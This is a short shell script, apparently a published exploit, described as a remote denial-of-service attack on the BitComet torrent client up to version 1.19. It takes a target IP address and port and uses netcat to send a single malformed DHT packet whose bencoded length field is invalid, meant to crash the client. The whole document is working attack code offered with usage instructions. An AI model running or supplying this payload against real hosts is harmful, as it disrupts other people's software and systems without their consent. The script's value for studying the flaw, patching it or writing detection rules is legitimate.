#!/bin/sh
#
# BitComet <= 1.19 Remote DOS Exploit
# Pierre Nogues - http://www.indahax.com/
#
# Description:
#     BitComet is a torrent client
#
#     BitComet doesn't handle malicious DHT packet with an invalid bencoded
message.
#
# Affected versions :
#     BitComet <= 1.19
#
# Plateforms :
#     Windows
#
# Usage :
#     ./exploit.sh ip port

if [ $# -ne 2 ]; then
    echo "./exploit.sh ip port"
    exit 1
fi

nc -u $1 $2 << .
d4294967285:y1:q1:t4:\x001:q4:ping1:ad2:id20:01234567890123456789ee 
